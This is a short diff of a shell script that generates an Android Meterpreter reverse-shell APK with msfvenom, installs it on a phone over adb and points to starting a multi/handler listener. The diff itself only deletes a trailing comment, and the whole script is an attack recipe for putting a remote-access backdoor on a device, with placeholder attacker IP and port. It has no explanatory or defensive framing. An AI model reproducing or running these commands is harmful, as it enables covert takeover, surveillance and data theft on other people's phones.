@@ -1,5 +1,5 @@
 adb devices
-msfvenom -p android/meterpreter/reverse_tcp lhost="your ip"  lport="port" R >/root/hackhandy.apk # remove clasps
+msfvenom -p android/meterpreter/reverse_tcp lhost="your ip"  lport="port" R >/root/hackhandy.apk
 adb install /root/hackhandy.apk
 echo Open MainActivity
 echo multi/handler
